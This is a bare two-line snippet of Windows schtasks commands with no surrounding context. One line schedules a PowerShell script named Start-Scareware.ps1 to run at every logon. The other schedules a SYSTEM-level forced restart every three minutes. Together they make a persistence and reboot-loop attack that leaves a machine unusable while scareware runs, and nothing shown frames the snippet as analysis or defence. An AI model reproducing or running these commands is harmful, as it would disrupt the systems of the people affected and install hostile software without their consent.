schtasks.exe /create /tn "Cause" /tr "powershell -c 'C:\Users\Public\Start-Scareware.ps1'" /sc onlogon /it
schtasks.exe /create /tn "Effect" /tr "shutdown /r /t 000" /ru "SYSTEM" /sc minute /mo 3 
